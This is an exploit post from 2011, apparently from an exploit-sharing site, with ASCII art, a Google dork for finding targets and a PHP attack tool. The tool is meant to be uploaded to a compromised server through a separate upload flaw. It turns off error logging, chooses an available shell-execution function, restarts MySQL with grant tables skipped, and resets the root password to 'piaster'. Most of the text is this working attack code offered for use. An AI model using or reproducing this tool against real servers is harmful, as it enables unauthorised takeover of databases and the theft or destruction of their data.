
                     .-"""-.
                    / .===. \
                    \/ 6 6 \/
                    ( \___/ )
  ______________ooo__\_____/__________________
 /                                             \
|           __  __  ___                        |
|        /|  _)  _)   /_| _       _ _  _       |
|         | __) __)  /(_|(_|\/.  (_(_)|||      |
|                           /                  |
| $3ll:      G5 (W.DLL) version 1.5            |
| author:    Piaster  (wadelamin)              |
| E-mail:    w.dll@live.com                    |
| copyright: 2010-2011                         |
| Page:http://www.facebook.com/Pias.Piaster    |
 \___________________________ooo______________/
                    |  |  |
                    |_ | _|
                    |  |  |
                    |__|__|
                    /-&#039;P&#039;-\
                   (__/ \__)

# Exploit Title: [phpMyAdmin Root Password]
# Date: [21/6/2011]
# Home: 1337day.com
# Author: [Piaster (wadelamin)]
# phpmyadmin: Software Link: [www.appservnetwork.com ||www.phpmyadmin.net]
# Version: [all phpmyadmin Version]
# Category:: [remote, local]
# Google dork: [inurl:phpMyAdmin ||  The AppServ Open Project - [all Version] for Windows ]
# Tested on: [Windows & unix]
# E-mail: w.dll@live.com
# Page: http://www.facebook.com/Pias.Piaster



File Bug:
//-----------------C:\AppServ\MySQL\scripts/resetpwd.php----------------//

echo "Welcome to AppServ MySQL Root Password Reset Program\n\n";

AppServCMD();

function AppServCMD() {
	define(&#039;STDIN&#039;,fopen("php://stdin","r"));
	echo " Enter New Password : ";
	$input = trim(fgets(STDIN,256));
	$input = ereg_replace(&#039;\"&#039;, "\\\"", $input);
	$input = ereg_replace(&#039;\&#039;&#039;, "\&#039;", $input); 
	echo "\n   Please wait ...................................\n\n";
	exec ("net stop mysql");
	exec (&#039;start /b C:\AppServ\MySQL\bin\mysqld-nt.exe --skip-grant-tables --user=root&#039;);

//You can add a password and then request the file via the browser

	exec ("C:\[AppServ]\MySQL\bin\mysql -e \"update mysql.user set PASSWORD=PASSWORD(&#039;[root pwd]&#039;) where user = &#039;root&#039;;\"");
	exec ("C:\[AppServ]\MySQL\bin\mysqladmin -u root shutdown");
	sleep(3);
	exec ("net start mysql");
}
//--------------------------------END-----------------------------------//



I&#039;ve modified the file and then request the file from abroad
But first there must be a upload exploit on server so they can upload the tool like any other tool or Shell Script
And then request the file via the browser

There Important Note:
If the Windows server can access phpMyAdmin immediately 
if the file to complete the process this means that 
it is restarted the Mysql and then change the password.




//---------------------------------Exploit the vulnerability tool------------------------//
<?
echo "<style type=&#039;text/css&#039;>* { margin: 0; padding: 0; }A {color:#ffffff;text-decoration:none;}A:hover {color:yellow;text-decoration:underline;}body,table { font-family:verdana;font-size:11px;color:white;background-color:#993333; }.table5 { font-family:verdana;font-size:11px;color:white;background-color:black; }table { width:30%; }table,td { border:1px solid #808080;margin-top:2;margin-bottom:2;padding:5px; }input{ color:#000000;border:2px solid #666666; }.barheader,.mainpaneltable,td { border:1px solid #333333; }.input{ border:2px  gold;margin:0; }input[type=&#039;submit&#039;] { border:1px solid black; } input[type=&#039;text&#039;] { padding:5px;}input[type=&#039;button&#039;] { background-color:gold; }.select,option,input[type=&#039;button&#039;]:hover { background-color:red; }input[type=&#039;submit&#039;] { background-color:orange }.select,option,input[type=&#039;submit&#039;]:hover { background-color:red; }input,input[type=&#039;text&#039;]:hover { background-color:#AF2C07; }textarea,.mainpanel input,select,option { background-color:orange; }</style>";echo "<head><title>PiAsTeR VS phpMyAdmin</title><div style=\"background: orange;\"><p align=\"center\"><font size=\"2\" <h1><font color = red><b>PiAsTeR</font> VS <font color = red>phpMyAdmin</font></h1></b></p><hr color=\"black\"</div></div><center><BR>";$f = &#039;<a href="http://www.facebook.com/Pias.Piaster" target="_blank">Facebook</a>&#039;;

@set_time_limit(0);
@ini_restore("safe_mode");
@ini_restore("allow_url_fopen");
@ini_restore("open_basedir");
@ini_restore("disable_functions");
@ini_restore("safe_mode_exec_dir");
@ini_restore("safe_mode_include_dir");

@ini_set(&#039;error_log&#039;,NULL);
@ini_set(&#039;log_errors&#039;,0);
@ini_set(&#039;max_execution_time&#039;,0);
@ini_set(&#039;output_buffering&#039;,0);

$win = strtolower(substr(PHP_OS,0,3)) == "win";
if(function_exists(&#039;exec&#039;)){$pias = exec;}
elseif(function_exists(&#039;shell_exec&#039;)){$pias = shell_exec;}
elseif(function_exists(&#039;system&#039;)) {$pias = system ;}
elseif(function_exists(&#039;passthru&#039;)) { $pias = passthru ;}

if($win) {
	define(&#039;STDIN&#039;,fopen("php://stdin","r"));
	$input = trim(fgets(STDIN,256));
	$input = ereg_replace(&#039;\"&#039;, "\\\"", $input);
	$input = ereg_replace(&#039;\&#039;&#039;, "\&#039;", $input); 
	echo "\n   Please wait ...................................\n\nGoodluck ... <br>USER: root & PASSWORD: piaster";
	$pias("net stop mysql");
	$pias(&#039;start /b C:\AppServ\MySQL\bin\mysqld-nt.exe --skip-grant-tables --user=root&#039;);
	$pias("C:\AppServ\MySQL\bin\mysql -e \"update mysql.user set PASSWORD=PASSWORD(&#039;piaster&#039;) where user = &#039;root&#039;;\"");
	$pias("C:\AppServ\MySQL\bin\mysqladmin -u root shutdown");
	sleep(3);
	$pias("net start mysql");} 

if(!$win) {
echo &#039;<br><br><br><form action="#" method="post"><p align="center"><table><tr><td>user<input name="dbu" size="20" value = &#039; . $_REQUEST[&#039;dbu&#039;] . &#039; ><td>password<input name="dbp" size="20" value = &#039; . $_REQUEST[&#039;dbp&#039;] . &#039; ><td>host<input name="dbh" size="20" value = &#039; . $_REQUEST[&#039;dbh&#039;] . &#039;></tr></table><input type="submit" value="GO" name = "pias" /> </p></form></td></tr><td><tr>&#039;;

if(isset($_REQUEST[&#039;pias&#039;])){
    
$dbu = $_REQUEST[&#039;dbu&#039;];
$dbp = $_REQUEST[&#039;dbp&#039;];
$dbh = $_REQUEST[&#039;dbh&#039;]? $_REQUEST[&#039;dbh&#039;] : &#039;localhost&#039;;
$conn = @mysql_connect($dbh, $dbu, $dbp);
$select = @mysql_select_db(&#039;mysql&#039;, $conn);
if (!$select) {
echo @mysql_error();}
$t1 = "UPDATE mysql.user set PASSWORD=PASSWORD(&#039;piaster&#039;) where user = &#039;root&#039;;";
$go1 = @mysql_query( $t1 , $conn);
if($go1){echo &#039;<center><br>Goodluck ... Now Wait Until Mysql Restart and Come back with USER: root & PASSWORD: piaster</center>&#039;;}
else echo &#039;database mysql not acsses or not found ty agin&#039;;}}

echo &#039;<br><br>By Piaster :: w.dll@live.com :: &#039;. $f ;

?> 
//---------------------------------Exploit the vulnerability tool end--------------------//



